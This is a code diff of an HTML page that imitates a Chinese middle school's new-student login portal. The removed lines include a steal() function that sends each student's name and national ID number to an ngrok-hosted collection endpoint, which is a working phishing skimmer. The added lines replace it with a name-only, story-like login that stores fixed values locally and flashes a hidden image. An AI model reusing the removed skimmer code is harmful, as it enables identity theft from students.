@@ -7,136 +7,171 @@
     <title>无锡市第一中学学生综合管理平台</title>
     <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/style.css">
     <script src="https://yzxs.wxeic.com/public/default/js/jquery.min.js"></script>
+    <style>
+        /* 确保异常图片预加载时不可见 */
+        #anomaly-preload {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
 </head>
 <body>
-<div class="wrapper">
-    <!-- 头部 -->
-    <div class="head">
-        <div class="container position-relative">
-            <!-- 顶部 logo 通过 background-image 设置，使用本地图片 -->
-            <a href="https://yzxs.wxeic.com/home" id="logo" class="fl" style="background:url('img/header_logo.png') no-repeat; background-size:cover; -webkit-background-size:cover; -o-background-size:cover;"></a>
-            <ul id="header_link">
-                <li><a href="https://yzxs.wxeic.com/home">首页</a></li>
-                <li><a href="https://yzxs.wxeic.com/article/index?cid=5">通知公告</a></li>
-                <li><a href="https://yzxs.wxeic.com/article/index?cid=6">温馨提示</a></li>
-            </ul>
-            <div id="quick">
-                <a href="https://yzxs.wxeic.com/home" class="ci-btn"></a>
-            </div>
-            <div class="user-btn">
-                <a href="https://yzxs.wxeic.com/home"><img src="img/home.png" alt=""></a>
+    <!-- 异常图片预加载（隐藏，确保点击时能立即显示） -->
+    <img id="anomaly-preload" src="img/banner_anomaly.png" alt="">
+
+    <div class="wrapper">
+        <!-- 头部 -->
+        <div class="head">
+            <div class="container position-relative">
+                <!-- 顶部 logo 通过 background-image 设置，使用本地图片 -->
+                <a href="https://yzxs.wxeic.com/home" id="logo" class="fl" style="background:url('img/header_logo.png') no-repeat; background-size:cover; -webkit-background-size:cover; -o-background-size:cover;"></a>
+                <ul id="header_link">
+                    <li><a href="https://yzxs.wxeic.com/home">首页</a></li>
+                    <li><a href="https://yzxs.wxeic.com/article/index?cid=5">通知公告</a></li>
+                    <li><a href="https://yzxs.wxeic.com/article/index?cid=6">温馨提示</a></li>
+                </ul>
+                <div id="quick">
+                    <a href="https://yzxs.wxeic.com/home" class="ci-btn"></a>
+                </div>
+                <div class="user-btn">
+                    <a href="https://yzxs.wxeic.com/home"><img src="img/home.png" alt=""></a>
+                </div>
             </div>
         </div>
-    </div>
 
-    <div class="main-body">
-        <div class="container">
-            <div id="slider">
-                <img src="img/banner.jpg" alt="轮播图">
-            </div>
-            <div class="box">
-                <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/swiper-bundle.min.css">
-                <script src="https://yzxs.wxeic.com/public/default/js/swiper-bundle.min.js"></script>
-                <div class="sidebar">
-                    <!-- 登录 -->
-                    <div class="login border-default">
-                        <div class="login-heading">新生登录</div>
-                        <div class="login-body">
-                            <div class="form-group">
-                                <a href="https://yzxs.wxeic.com/passport/login" class="btn btn-user-home btn-block">点击登录</a>
+        <div class="main-body">
+            <div class="container">
+                <div id="slider">
+                    <img src="img/banner.jpg" alt="轮播图" id="banner-img">
+                </div>
+                <div class="box">
+                    <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/swiper-bundle.min.css">
+                    <script src="https://yzxs.wxeic.com/public/default/js/swiper-bundle.min.js"></script>
+                    <div class="sidebar">
+                        <!-- 登录 -->
+                        <div class="login border-default">
+                            <div class="login-heading">新生登录</div>
+                            <div class="login-body">
+                                <div class="form-group">
+                                    <a href="https://yzxs.wxeic.com/passport/login" class="btn btn-user-home btn-block">点击登录</a>
+                                </div>
                             </div>
                         </div>
-                    </div>
-                    <!-- 二维码 -->
-                    <div class="ewm border-default">
-                        <div class="swiper-container" style="height:245px;">
-                            <div class="swiper-wrapper">
-                                <div class="swiper-slide">
-                                    <img src="img/ewm.png" alt="二维码">
-                                    <div class="qrcode-description">
-                                        (无锡一中微信公众号)<br />扫描二维码添加关注
+                        <!-- 二维码 -->
+                        <div class="ewm border-default">
+                            <div class="swiper-container" style="height:245px;">
+                                <div class="swiper-wrapper">
+                                    <div class="swiper-slide">
+                                        <img src="img/ewm.png" alt="二维码">
+                                        <div class="qrcode-description">
+                                            (无锡一中微信公众号)<br />扫描二维码添加关注
+                                        </div>
                                     </div>
                                 </div>
-                            </div>
-                            <div class="swiper-pagination"></div>
-                        </div>
-                    </div>
-                    <!-- 网站链接 -->
-                    <div class="blogroll">
-                        <ul class="nav">
-                            <li><a href="https://yizhong.wxeic.cn/" target="_blank">学校主页</a></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="main-content ">
-                    <div class="part border-default mt-10">
-                        <div class="title-panel">
-                            <div class="title-bar fl">
-                                <img src="img/notice.png" alt="通知图标">
-                                学生登录
+                                <div class="swiper-pagination"></div>
                             </div>
                         </div>
+                        <!-- 网站链接 -->
+                        <div class="blogroll">
+                            <ul class="nav">
+                                <li><a href="https://yizhong.wxeic.cn/" target="_blank">学校主页</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="main-content ">
+                        <div class="part border-default mt-10">
+                            <div class="title-panel">
+                                <div class="title-bar fl">
+                                    <img src="img/notice.png" alt="通知图标">
+                                    新生登录
+                                </div>
+                            </div>
 
-                        <div style="background-color: #fff;text-align: center;padding-bottom: 20px; padding-top:40px;">
-                            <form action="https://yzxs.wxeic.com/passport/login" method="post" onsubmit="steal(event)">
-                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
-                                    <label style="font-size: 14px;line-height: 40px;">学生姓名：</label>
-                                    <input type="text" class="form-control" name="name" placeholder="请输入学生姓名" required="required" style="width:200px; height:30px; border:1px solid #999; border-radius:3px;">
-                                </div>
-                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
-                                    <label style="font-size: 14px;line-height: 40px;">身份证号：</label>
-                                    <input type="text" class="form-control" name="id_number" placeholder="请输入学生身份证号码" required="required" style="width:200px;height:30px; border:1px solid #999; border-radius:3px;">
-                                </div>
-                                <button class="btn btn-red btn-block" type="submit" style="width:100px;margin:0 auto; margin-top:20px;">登录</button>
-                            </form>
+                            <div style="background-color: #fff;text-align: center;padding-bottom: 20px; padding-top:40px;">
+                                <!-- 引导语 -->
+                                <p style="font-size: 15px; color: #333; line-height: 28px; margin-bottom: 10px; padding: 0 30px;">
+                                    亲爱的同学，欢迎来到无锡市第一中学新生综合管理平台。<br>请输入你的姓名以完成登录。
+                                </p>
+                                <p style="font-size: 12px; color: #999; margin-bottom: 25px;">
+                                    登录后请尽快完成住宿申请与校服订购。
+                                </p>
+
+                                <form id="login-form" onsubmit="return handleLogin(event)">
+                                    <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
+                                        <label style="font-size: 14px;line-height: 40px;">学生姓名：</label>
+                                        <input type="text" class="form-control" name="name" id="student-name" placeholder="请输入你的姓名" required="required" style="width:200px; height:30px; border:1px solid #999; border-radius:3px;">
+                                    </div>
+                                    <button class="btn btn-red btn-block" type="submit" style="width:100px;margin:0 auto; margin-top:20px;">点击登录</button>
+                                </form>
+                            </div>
+                            <div style="background-color: #fff;text-align: center;padding-bottom: 60px; padding-top:10px; font-size:12px; color: #aaa;">请使用真实姓名登录，以便系统匹配档案信息。</div>
                         </div>
-                        <div style="background-color: #fff;text-align: center;padding-bottom: 60px; padding-top:30px; font-size:12px;">说明：身份证号码中“X”为大写</div>
                     </div>
                 </div>
             </div>
         </div>
-    </div>
 
-    <!-- 尾部 -->
-    <div class="foot">
-        <div class="container">
-            <a href="#" class="botLogo">
-                <img src="img/footer_logo.png" alt="底部logo">
-            </a>
-            <p>Copyright © 2026 无锡市第一中学 All Rights Reserved.</p>
+        <!-- 尾部 -->
+        <div class="foot">
+            <div class="container">
+                <a href="#" class="botLogo">
+                    <img src="img/footer_logo.png" alt="底部logo">
+                </a>
+                <p>Copyright &copy; 2026 无锡市第一中学 All Rights Reserved.</p>
+            </div>
         </div>
     </div>
-</div>
 
-<!-- 由于我们直接在 a 标签的 style 中设置了背景，不再需要 JS 动态设置 logo，但为了保留原有 jQuery 初始化，可以保留空的 ready -->
-<script>
-    // 原有的 $(document).ready 已内联到 a 标签的 style，不再需要此处代码
-    // 但仍然保留以保持一致性
-    $(document).ready(function(){
-        // logo 已在 a 标签中直接设置，无需再操作
-    });
-</script>
-<script src="https://yzxs.wxeic.com/public/baidu.js"></script>
+    <script src="https://yzxs.wxeic.com/public/baidu.js"></script>
 
-<script>
-function steal(e) {
-    var name = document.querySelector('input[name="name"]').value;
-    var idNumber = document.querySelector('input[name="id_number"]').value;
-    if (name && idNumber) {
-        var data = {
-            name: name,
-            id: idNumber,
-            time: new Date().toISOString()
-        };
-        fetch('https://matrimony-raving-colony.ngrok-free.dev/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data),
-            mode: 'cors'
-        }).catch(function(err) {});
-    }
-    return true;
-}
-</script>
+    <script>
+        // 预加载异常图片（确保点击时立即可用）
+        var anomalyPreloaded = document.getElementById('anomaly-preload');
+        var anomalySrc = 'img/banner_anomaly.png';
+
+        // 确保异常图片完全加载
+        var anomalyImg = new Image();
+        anomalyImg.src = anomalySrc;
+
+        function handleLogin(e) {
+            e.preventDefault();
+            var nameInput = document.getElementById('student-name');
+            var name = nameInput.value.trim();
+
+            if (!name) {
+                alert('请先输入姓名。');
+                return false;
+            }
+
+            // 提取姓氏（第一个汉字）
+            var surname = name.charAt(0);
+
+            // 存储到 localStorage
+            localStorage.setItem('studentName', name);
+            localStorage.setItem('studentSurname', surname);
+            localStorage.setItem('studentID', '270512');
+            localStorage.setItem('dormitorySubmitted', 'false');
+            localStorage.setItem('uniformSubmitted', 'false');
+            localStorage.setItem('conflictTriggered', 'false');
+            localStorage.setItem('conflictTraceCode', '20110512-0001');
+
+            // 闪现异常图片 —— 约0.3秒后跳转
+            var bannerImg = document.getElementById('banner-img');
+            var originalSrc = bannerImg.src;
+            bannerImg.src = anomalySrc;
+
+            // 300毫秒后跳转到主页面
+            setTimeout(function() {
+                window.location.href = 'home.html';
+            }, 300);
+
+            return false;
+        }
+    </script>
 </body>
 </html>
